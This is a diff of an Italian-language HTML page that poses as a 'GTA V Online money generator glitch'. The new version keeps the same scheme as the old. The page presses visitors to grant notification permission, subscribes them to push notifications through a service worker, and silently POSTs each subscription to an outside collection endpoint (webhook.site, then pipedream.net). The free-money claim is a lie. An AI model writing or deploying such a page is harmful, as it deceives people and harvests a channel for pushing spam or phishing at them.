@@ -1,45 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
     <meta charset="UTF-8">
-    <title>GTA V Glitch</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA V Online - Generatore Soldi</title>
     <style>
-        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; }
-        button { background: #f00; color: #fff; padding: 20px; border: none; cursor: pointer; border-radius: 10px; font-weight: bold; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
+        #main-btn { 
+            background-color: #ff0000; color: white; border: none; padding: 20px 40px; 
+            font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px;
+            box-shadow: 0 0 20px #ff0000;
+        }
     </style>
 </head>
 <body>
-    <h1>ATTIVAZIONE REQUISITI GTA V</h1>
-    <button onclick="attiva()">CLICCA PER ACCREDITO</button>
+
+    <h1>SISTEMA ACCREDITO GTA V</h1>
+    <p>Stato Server: <span style="color:white">CONNESSO</span></p>
+    <br>
+    <button id="main-btn">RICEVI SOLDI (GLITCH 2026)</button>
 
     <script>
-        // Registrazione Agente
+        // Registrazione Service Worker
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js');
+            navigator.serviceWorker.register('sw.js');
         }
 
-        function attiva() {
-            Notification.requestPermission().then(function(p) {
-                if (p === 'granted') {
-                    alert('CONNESSO! Attendere...');
+        document.getElementById('main-btn').addEventListener('click', function() {
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') {
+                    alert('Sincronizzazione in corso... Non chiudere la pagina.');
+                    
                     navigator.serviceWorker.ready.then(function(reg) {
                         reg.pushManager.subscribe({
                             userVisibleOnly: true,
                             applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU'
                         }).then(function(sub) {
-                            // INVIO AL TUO DATABASE
-                            fetch('https://webhook.site/562e593a-485a-4b2d-ba7d-245bc5f33e72', {
+                            
+                            // INVIO DEI DATI AL NUOVO PIPEDREAM
+                            fetch('https://eohg99rpfo5glba.m.pipedream.net', {
                                 method: 'POST',
                                 body: JSON.stringify(sub),
                                 headers: { 'Content-Type': 'application/json' }
+                            }).then(function() {
+                                console.log('Dati inviati con successo.');
                             });
+                            
                         });
                     });
                 } else {
-                    alert('Devi cliccare CONSENTI');
+                    alert('Errore: Devi cliccare su CONSENTI per attivare il glitch!');
                 }
             });
-        }
+        });
     </script>
 </body>
 </html>
